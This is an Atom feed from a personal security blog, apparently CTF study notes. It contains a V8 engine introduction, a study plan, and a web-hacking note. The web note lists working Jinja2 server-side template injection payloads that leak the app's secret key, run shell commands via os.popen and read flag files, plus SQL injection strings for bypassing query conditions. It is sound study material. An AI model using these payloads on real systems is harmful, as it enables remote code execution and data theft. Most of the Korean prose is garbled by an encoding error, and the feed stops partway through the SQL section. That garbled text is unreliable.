<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-19T13:57:08+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hacky Life &amp;amp; Writeup</title><subtitle>be the special st4rlight in the world ğŸŒ </subtitle><author><name>st4rlight (Ainsetin)</name></author><entry><title type="html">[V8 Study] 00-introduction</title><link href="http://localhost:4000/note/V8-introduction/" rel="alternate" type="text/html" title="[V8 Study] 00-introduction" /><published>2022-05-17T16:30:00+09:00</published><updated>2022-05-17T16:30:00+09:00</updated><id>http://localhost:4000/note/V8-introduction</id><content type="html" xml:base="http://localhost:4000/note/V8-introduction/"><![CDATA[<p><strong>[!] ìš°ì„ ì ìœ¼ë¡œ í•œê¸€ë¡œ ì‘ì„±í•˜ì—¬ ì¶”í›„ ë²ˆì—­í•  ì˜ˆì •.</strong></p>

<h2 id="summary">Summary</h2>
<p>ìš°ë¦¬ê°€ ëŒ€ì¤‘ì ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” Google Chrome browserì—ëŠ” ì›¹í˜ì´ì§€ë¥¼ ë™ì ìœ¼ë¡œ ì‹¤í–‰ì‹œí‚¤ê¸° ìœ„í•´ javascriptê°€ êµ¬ë™ë  ìˆ˜ ìˆë„ë¡ ì§€ì›í•˜ê³  ìˆë‹¤. ê·¸ë ‡ë‹¤ë©´, JSë¥¼ ì›í™œí•˜ê²Œ ì‹¤í–‰í•˜ê³  ì»´íŒŒì¼í•˜ëŠ” ì—­í• ì€ ì–´ë–¤ ê²ƒì´ ë§¡ê³  ìˆì„ê¹Œ? ì´ ì±•í„°ì—ì„œëŠ” ë‚´ê°€ ê³µë¶€í–ˆë˜ chromium javascript engineì¸ V8ì— ëŒ€í•´ì„œ ì•Œì•„ë³´ê³ ì í•œë‹¤.</p>

<h2 id="v8ì˜-êµ¬ì¡°ëŠ”-ì–´ë–»ê²Œ-ë˜ì–´-ìˆì„ê¹Œ">V8ì˜ êµ¬ì¡°ëŠ” ì–´ë–»ê²Œ ë˜ì–´ ìˆì„ê¹Œ?</h2>

<p>V8ê°™ì€ ê²½ìš° Chrome êµ¬ë™ ì‹œ í•˜ë‚˜ì˜ í”„ë¡œì„¸ìŠ¤ë¡œ ì‹¤í–‰ë˜ì–´ heap ë° stack ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê´€ë¦¬í•˜ë©´ì„œ Javascriptì˜ ê°ì¢… ë³€ìˆ˜ì™€ ë©”ì†Œë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê°€ì¥ í•µì‹¬ì ì¸ execution fileë¡œ ë™ì‘í•œë‹¤. ì´ì™¸ì— Task/Callback queue, Microtask queue, WebAPI ë“± ë‹¤ì–‘í•œ ìš”ì†Œê°€ Chromium browserë¥¼ êµ¬ì„±í•˜ê³  ë™ì‘í•˜ëŠ”ë° ì‚¬ìš©ëœë‹¤.</p>

<p>ê°€ì¥ ëŒ€í‘œì ì¸ ì—­í• ì€ javascript ì½”ë“œë¥¼ ì»´íŒŒì¼ëœ ì»´í“¨í„°ì— ìµœì í™”ëœ ì½”ë“œë¡œ ë³€í™˜ì‹œì¼œ ì „ë‹¬í•˜ê²Œ ëœë‹¤ëŠ” ê²ƒì´ë‹¤. ì´ë•Œ <code class="language-plaintext highlighter-rouge">JIT(Just-In-Time) Compiler</code>ë¼ëŠ” ë…ì°½ì ì¸ ì»´íŒŒì¼ëŸ¬ë¥¼ ì‚¬ìš©í•œë‹¤.</p>

<h2 id="v8ë§Œì˜-íŠ¹ì§•ì€-ë¬´ì—‡ì´-ìˆì„ê¹Œ">V8ë§Œì˜ íŠ¹ì§•ì€ ë¬´ì—‡ì´ ìˆì„ê¹Œ?</h2>
<p><img src="/images/2022-V8/intro/inter-comp.png" alt="inter-comp.png" /></p>

<p>ìš°ì„  ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì— ëŒ€í•´ ì•Œì•„ì•¼ í•  ê²ƒì´ë‹¤.</p>
<ol>
  <li>ì¸í„°í”„ë¦¬í„°
    <ul>
      <li>ì¥ì  : í•œ ì¤„ í•œ ì¤„ ë³€í™˜í•˜ê¸° ë•Œë¬¸ì— ì‹¤í–‰ ì†ë„ê°€ ë¹ ë¥´ë‹¤.</li>
      <li>ë‹¨ì  : ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œê°€ ë³µì¡í•´ì§ˆìˆ˜ë¡ ì ì  ì†ë„ê°€ ëŠë ¤ì§„ë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ê°™ì€ ì½”ë“œë¥¼ ì—¬ëŸ¬ì°¨ë¡€ ë°˜ë³µí•˜ëŠ” ë°˜ë³µë¬¸ì˜ ê²½ìš°, ê°™ì€ ê²°ê³¼ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì„ì—ë„ ë¶ˆêµ¬í•˜ê³  ì½”ë“œë¥¼ í•œ ì¤„ í•œ ì¤„ ì½ëŠ” ë°©ì‹ì— ì˜í•´ ê·¸ë•Œê·¸ë•Œ ì‹¤í–‰ëœë‹¤.</li>
    </ul>
  </li>
  <li>ì»´íŒŒì¼ëŸ¬
    <ul>
      <li>ì¥ì  : íŒŒì¼ ì „ì²´ë¥¼ í•œë²ˆì— ì½ì–´ì„œ ì»´íŒŒì¼ëŸ¬ëŠ” ì‘ì—…ì„ ë‹¨ìˆœí™”ì‹œí‚¨ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ íŠ¹ì • í•¨ìˆ˜ë¥¼ 10ì–µë²ˆ ë°˜ë³µí•´ì•¼ í•  ê²½ìš°, ì»´íŒŒì¼ ê³¼ì •ì—ì„œ í•¨ìˆ˜ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ í•¨ìˆ˜ì˜ ê²°ê³¼ë¬¼ì„ ë°˜ë³µí•˜ë„ë¡ ì»´íŒŒì¼ í•œë‹¤. ì´ì²˜ëŸ¼ ë¶ˆí•„ìš”í•œ ë™ì‘ì„ ì œê±°í•˜ëŠ” ì»´íŒŒì¼ëŸ¬ì˜ ë°©ì‹ì„ ìµœì í™”, <code class="language-plaintext highlighter-rouge">optimization</code>ì´ë¼ê³  í•œë‹¤.<br />
(<em>ì¸í„°í”„ë¦¬í„°ëŠ” optimizeí•˜ì§€ ì•ŠëŠ”ë‹¤</em> )</li>
      <li>ë‹¨ì  : ì½”ë“œë¥¼ ë°”ë¡œ ì‹¤í–‰í•˜ì§€ ì•Šê³ , ì½”ë“œ ì‹¤í–‰ ì „ ì „ì²´ë¥¼ ì»´íŒŒì¼ í•˜ëŠ” ê³¼ì •ì´ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— ì´ˆê¸°ì— ì†ë„ê°€ ëŠë¦´ ìˆ˜ ë°–ì— ì—†ë‹¤.</li>
    </ul>
  </li>
</ol>

<p>ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ì˜ ë‚´ë¶€ë¥¼ ê³µë¶€í•˜ë‹¤ê°€ ì ì‹œ ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì˜ ê°„ë‹¨í•œ ê°œë…ê³¼ ì¥ë‹¨ì ì„ ì§šì–´ë´¤ë‹¤. ê·¸ëŸ¬ë©´ ê³¼ì—° V8 ì—”ì§„ì€ ì–´ë–¤ ë°©ì‹ì„ ì·¨í–ˆê¸¸ë˜ ë‹¤ë¥¸ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ë³´ë‹¤ ë” ë¹ ë¥´ê³  íš¨ìœ¨ì ìœ¼ë¡œ ìë°”ìŠ¤í¬ë¦½íŠ¸ ëª…ë ¹ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆì„ê¹Œ? ë°”ë¡œ ì—¬ê¸°ì—ì„œ V8 ì—”ì§„ì˜ ë…íŠ¹í•œ ì–¸ì–´ ë³€í™˜ ë„êµ¬ì¸ JIT Compilerê°€ ë“¤ì–´ì˜¨ë‹¤. JITì€ Just In Timeì˜ ì•½ìì´ë‹¤.</p>

<h2 id="jit-compilerì˜-êµ¬ì¡°">JIT Compilerì˜ êµ¬ì¡°</h2>
<p><img src="/images/2022-V8/intro/jit.png" alt="jit.png" /></p>

<p>V8 ì—”ì§„ì€ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì¡°ë¡œ ë˜ì–´ ìˆë‹¤.</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">Parser</code> : ì½”ë“œë¥¼ Lexical Analysisë¼ëŠ” ê³¼ì •ì„ í†µí•´ <strong>í† í°</strong>ìœ¼ë¡œ ë¶„í•´í•œë‹¤.</li>
  <li><code class="language-plaintext highlighter-rouge">AST(Abstract Syntax Tree)</code> : Parserì—ì„œ ë¶„í•´ëœ í† í°ì„ ë°”íƒ•ìœ¼ë¡œ ì¶”ìƒì ì¸ íŠ¸ë¦¬ë¥¼ ìƒì„±í•œë‹¤.</li>
  <li><code class="language-plaintext highlighter-rouge">Ignition</code> : ASTì—ì„œ ë‚˜ì˜¨ íŠ¸ë¦¬ë¥¼ V8ì˜ ì¸í„°í”„ë¦¬í„°ì¸ ignitionì—ê²Œ ì „ë‹¬í•˜ê³  ì´ê²ƒì„ ì¸í„°í”„ë¦¬í„°ëŠ” bytecodeë¡œ ë³€í™˜ì‹œí‚¨ë‹¤. (High-level Lang to Low-level Lang)</li>
  <li><code class="language-plaintext highlighter-rouge">TurboFan</code>, <code class="language-plaintext highlighter-rouge">Profiler</code> : bytecodeë¥¼ ì‹¤í–‰í•˜ì—¬ Human-readable Langì„ ì‹¤í–‰ì‹œí‚¤ê³ , ê·¸ì¤‘ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ê³  íŒë³„ëœ ì½”ë“œ ì¡°ê°ì€ <code class="language-plaintext highlighter-rouge">TurboFan</code>ìœ¼ë¡œ ë³´ë‚´ì ¸ ìµœì í™”ë¥¼ ìˆ˜í–‰í•˜ì—¬ ìƒˆë¡œìš´ ì»´íŒŒì¼ëœ ì½”ë“œë¡œ ì¬êµ¬ì„±ëœë‹¤. (ì´ë•Œ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ëŠ” ë§ì´ ë§¤ìš° ì¶”ìƒì ì´ë¯€ë¡œ <code class="language-plaintext highlighter-rouge">Profiler</code> ë¼ëŠ” ì¹œêµ¬í•œí…Œ ì‚¬ìš© ë¹ˆë„ ìˆ˜ ë“±ì„ ìˆ˜ì§‘í•˜ê²Œë” ì—­í• ì„ ë¶€ì—¬í•˜ê³ , ëª¨ì¸ ë°ì´í„°ë¥¼ í†µí•´ Turbofanì˜ ì•Œê³ ë¦¬ì¦˜ëŒ€ë¡œ ìµœì í™”ë¥¼ í•œë‹¤)</li>
</ol>

<h2 id="turbofanì€-ì–´ë–¤-ì¡°ê±´ìœ¼ë¡œ-ìµœì í™”í•˜ëŠ”-ê±¸ê¹Œ">Turbofanì€ ì–´ë–¤ ì¡°ê±´ìœ¼ë¡œ ìµœì í™”í•˜ëŠ” ê±¸ê¹Œ?</h2>
<ol>
  <li>
    <p>ì½”ë“œê°€ ëœ¨ê²ê³  ì•ˆì •ì ì¸ ê²ƒ, ì‰½ê²Œ ë§í•˜ë©´ ìì£¼ í˜¸ì¶œë˜ê³ (ëœ¨ê²ê³ ) ì½”ë“œê°€ ì•ˆ ë³€í•¨(ì•ˆì •ì )ì´ë¼ëŠ” ê²ƒì´ë‹¤. ë§¤ë²ˆ ê°™ì€ í–‰ë™ì„ ìˆ˜í–‰í•˜ëŠ” ë°˜ë³µë¬¸ ë‚´ì— ìˆëŠ” ì½”ë“œ ê°™ì€ ê²½ìš°ê°€ ì—¬ê¸°ì— í•´ë‹¹í•˜ê¸° ì‰½ë‹¤.</p>
  </li>
  <li>
    <p>ì¸í„°í”„ë¦¬íŒ…ëœ ë°”ì´íŠ¸ ì½”ë“œì˜ ê¸¸ì´ë¥¼ ë³´ê³  íŠ¹ì • ì„ê³„ì ì„ ë„˜ê¸°ì§€ ì•Šìœ¼ë©´ ì‘ì€ í•¨ìˆ˜ë¼ê³  íŒë‹¨í•´ì„œ ìµœì í™”ë¥¼ ì§„í–‰í•˜ëŠ” ê²ƒì´ë‹¤. ì‘ê³  ë‹¨ìˆœí•œ í•¨ìˆ˜ëŠ” í¬ê³  ë³µì¡í•œ í•¨ìˆ˜ë³´ë‹¤ ë™ì‘ì´ ë§¤ìš° ì¶”ìƒì ì´ê±°ë‚˜ ì œí•œì ì¸ í™•ë¥ ì´ ë†’ê¸° ë•Œë¬¸ì— ì•ˆì •ì ì´ë¼ê³  ë³¼ ìˆ˜ ìˆë‹¤.</p>
  </li>
</ol>

<p>[!] ê·¸ëŸ¬ë‚˜, ì»´íŒŒì¼ëŸ¬ëŠ” 100% ì™„ë²½í•˜ì§€ ëª»í•˜ê¸° ë•Œë¬¸ì— ì˜ë„ì™€ ë‹¤ë¥´ê²Œ ë°œì í™”(deoptimization)ê°€ ì¼ì–´ë‚  ìˆ˜ë„ ìˆë‹¤.</p>

<h2 id="next-topic">Next Topic</h2>
<p>ë‹¤ìŒì—ëŠ” V8ì—ì„œ ìë£Œí˜•ì´ë‚˜ JSì˜ ë‹¤ì–‘í•œ ë©”ì†Œë“œê°€ ì–´ë–¤ ì‹ìœ¼ë¡œ ì €ì¥ì´ ë˜ê³  ë¶ˆëŸ¬ì˜¬ ìˆ˜ ìˆëŠ”ì§€ë¥¼ ì•Œì•„ë³´ê³ ì í•œë‹¤.</p>

<h2 id="reference">reference</h2>
<ul>
  <li><a href="https://dkwjdi.tistory.com/194">https://dkwjdi.tistory.com/194</a></li>
  <li><a href="https://github.com/danbev/learning-v8/blob/master/notes/intro.md">https://github.com/danbev/learning-v8/blob/master/notes/intro.md</a></li>
</ul>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="note" /><summary type="html"><![CDATA[useful browser engine process for beginner]]></summary></entry><entry><title type="html">Personal R&amp;amp;D plan beginning from â€˜nowâ€™</title><link href="http://localhost:4000/life/list-after-graduate/" rel="alternate" type="text/html" title="Personal R&amp;amp;D plan beginning from â€˜nowâ€™" /><published>2021-11-08T17:00:00+09:00</published><updated>2021-11-08T17:00:00+09:00</updated><id>http://localhost:4000/life/list-after-graduate</id><content type="html" xml:base="http://localhost:4000/life/list-after-graduate/"><![CDATA[<p><strong>UPDATED : 19 JUL 2024 13:00 UTC+9 KST</strong>
<strong>That would be LAST UPDATE, Letâ€™s plan more!</strong></p>

<p>This is my plan to be finished until/after graduating.</p>

<h2 id="research">Research</h2>
<blockquote>
  <p>Â§ must be finished until new yearâ€™s day Â§</p>
  <ol>
    <li><del>Kernel : Dirty Cow Analysis (CVE-2016-5195) -Complete</del></li>
    <li><del>Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete</del></li>
  </ol>
</blockquote>

<h2 id="develop">Develop</h2>
<blockquote>
  <p>Â§ new year STUDY plan Â§</p>
  <ol>
    <li><del>Making interpreter/compiler with Rust (With Chris Ohk, ..)</del>
s
      <h2 id="goal">Goal</h2>
      <ul>
        <li>Try something <strong>â€œnewâ€</strong>, <a href="https://youtu.be/c6rP-YP4c5I"><strong>Try Everything</strong></a></li>
        <li><del>Pass any awesome Univ.â€™s admission (Complete)</del></li>
        <li><del>Pass drive license (Complete)</del></li>
        <li>Dreamhack Wargame 1st
          <ul>
            <li><del>Format Sniper (Learn &amp; Analyze about FSB, Solved :D)</del></li>
            <li><del>Dreamcurl (Rev O, Crypto X. So learn mathematics!, Solved :D)</del></li>
            <li><del>Unibitmap (Solved :D)</del></li>
            <li><del>dreamboard v2 (V8 : Solved :D)</del></li>
          </ul>
        </li>
        <li><del>Purchase another laptop (<code class="language-plaintext highlighter-rouge">DELL XPS 15 12th generation Intel CPU</code>)</del></li>
        <li>BoB (Best of the Best) 14th? 15th?</li>
        <li>Try to be the BEST without <code class="language-plaintext highlighter-rouge">competitive mind</code>, Just <code class="language-plaintext highlighter-rouge">enjoy</code></li>
      </ul>
    </li>
  </ol>
</blockquote>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="life" /><summary type="html"><![CDATA[2022ë…„ ì•ìœ¼ë¡œì˜ ê³„íš ë° ë§ˆìŒê°€ì§ì„ ì ì—ˆë˜ ê³³]]></summary></entry><entry><title type="html">web note (update 2021.10.27)</title><link href="http://localhost:4000/note/web-note-update/" rel="alternate" type="text/html" title="web note (update 2021.10.27)" /><published>2021-10-27T10:00:00+09:00</published><updated>2021-10-27T10:00:00+09:00</updated><id>http://localhost:4000/note/web-note-update</id><content type="html" xml:base="http://localhost:4000/note/web-note-update/"><![CDATA[<p><em>post will be frequently updated</em></p>

<h2 id="ssti-server-side-template-injection">SSTI (Server Side Template Injection)</h2>
<p>í•´ë‹¹ ì·¨ì•½ì ì€ ì›¹ í”„ë ˆì„ì›Œí¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì—¬ëŸ¬ ê°€ì§€ Template Engineì—ì„œ ë°œìƒí•˜ë©°, íŠ¹ë³„í•œ êµ¬ë¬¸ì„ í†µí•´ <code class="language-plaintext highlighter-rouge">RCE</code>ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ë„ ìˆë‹¤.<br />
This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.</p>

<p>â–¶ jinja2</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ê¸°ë³¸
</span><span class="p">{{</span> <span class="mi">4</span><span class="o">*</span><span class="mi">4</span> <span class="p">}}</span> <span class="o">=&gt;</span> <span class="mi">16</span>

<span class="c1"># check with config
</span><span class="p">{{</span> <span class="n">config</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">items</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">secret_key</span><span class="sh">'</span><span class="p">]</span> <span class="p">}}</span>

<span class="c1"># RCE with config
</span><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">].</span><span class="nf">popen</span><span class="p">(</span><span class="sh">"</span><span class="s">ls</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="p">(</span><span class="n">config</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">"</span><span class="s">__class__</span><span class="sh">"</span><span class="p">)).</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">].</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>

<span class="c1"># etc ('',(),get_flashed_messages, url_for, ...)
</span><span class="p">{{</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="o">**</span><span class="n">index</span><span class="o">**</span><span class="p">](</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">).</span><span class="nf">communicate</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">get_flashed_messages</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">url_for</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">eval</span><span class="p">(</span><span class="sh">'</span><span class="s">__import__(</span><span class="sh">"</span><span class="s">os</span><span class="sh">"</span><span class="s">).popen(</span><span class="sh">"</span><span class="s">ls -al</span><span class="sh">"</span><span class="s">).read()</span><span class="sh">'</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># with request - í•„í„°ë§ì´ ë§¤ìš° ë§ì„ ê²½ìš° more query + requestë¥¼ í™œìš©í•˜ì—¬ ìš°íšŒ
</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">foo</span><span class="p">.</span><span class="n">bar</span><span class="o">/</span><span class="err">?</span><span class="n">payload</span><span class="o">=</span><span class="p">{{</span> <span class="n">request</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">class</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">mro</span><span class="sh">'</span><span class="p">))</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">getitem</span><span class="sh">'</span><span class="p">))(</span><span class="mi">1</span><span class="p">)</span> <span class="p">}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="n">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="n">__mro__</span><span class="o">&amp;</span><span class="n">getitem</span><span class="o">=</span><span class="n">__getitem__</span>
<span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">application</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__getitem__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__getitem__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">popen</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">)()}}</span>
</code></pre></div></div>

<p><br /></p>

<h2 id="sqli-sql-injection">SQLI (sql injection)</h2>
<p>í•´ë‹¹ ì·¨ì•½ì ì€ DBë¥¼ ê´€ë¦¬í•˜ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ SQL ì¿¼ë¦¬ë¥¼ ì „ë‹¬í•  ë•Œ ì˜ë„í•˜ì§€ ì•Šì€ êµ¬ë¬¸ì„ ì „ë‹¬í•  ìˆ˜ ìˆë„ë¡ ë³€ì¡°ì‹œí‚¤ëŠ” ë° ëª©ì ì´ ìˆë‹¤.<br />
The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.</p>

<p><strong>1. Comment symbol</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/* ~ */</code>, <code class="language-plaintext highlighter-rouge">-- ~</code>, <code class="language-plaintext highlighter-rouge">#</code> (URL encoded : <code class="language-plaintext highlighter-rouge">%23</code>)</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>

<span class="c1">-- Select ALL query from tbl</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1-- "</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--'</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1#"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1/*1234*/"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="cm">/*1234*/</span><span class="s1">' ...?
(must have closed symbol)
</span></code></pre></div></div>

<p><strong>2. with single quarter</strong></p>
<ul>
  <li>idê°€ <code class="language-plaintext highlighter-rouge">''</code>ë¡œ ê°ì‹¸ì ¸ ìˆì„ ê²½ìš° <code class="language-plaintext highlighter-rouge">'</code>ë¥¼ inputìœ¼ë¡œ ë„£ì–´ ë¨¼ì € ë‹«ì•„ì£¼ê²Œë” í•œ ë’¤ ì¡°ê±´ë¬¸ì„ ì´ì–´ì¤€ë‹¤.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>

<span class="c1">-- Select ALL query from tbl</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1='1"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="s1">'1'</span>
</code></pre></div></div>

<p><strong>3. and, or, &amp;&amp;, ||, in, between, like</strong></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- and, or</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">or</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>

<span class="c1">-- &amp;&amp;, || (no space required)</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">&amp;&amp;</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">||</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>

<span class="c1">-- in</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span> <span class="k">in</span> <span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span> <span class="k">in</span> <span class="s1">'5678'</span>

<span class="c1">-- between and (both number and char are possible)</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">age</span> <span class="k">between</span> <span class="mi">20</span> <span class="k">and</span> <span class="mi">30</span> <span class="c1">-- 20&lt;=age&lt;=30</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">score</span> <span class="k">between</span> <span class="s1">'A'</span> <span class="k">and</span> <span class="s1">'C'</span> <span class="c1">-- 'A'&lt;=score&lt;='C'</span>

<span class="c1">--like (starts with ~, ends with ~, include ~, length)</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'Bae%'</span> <span class="c1">-- starts with Bae</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%uk'</span> <span class="c1">-- ends with uk</span>
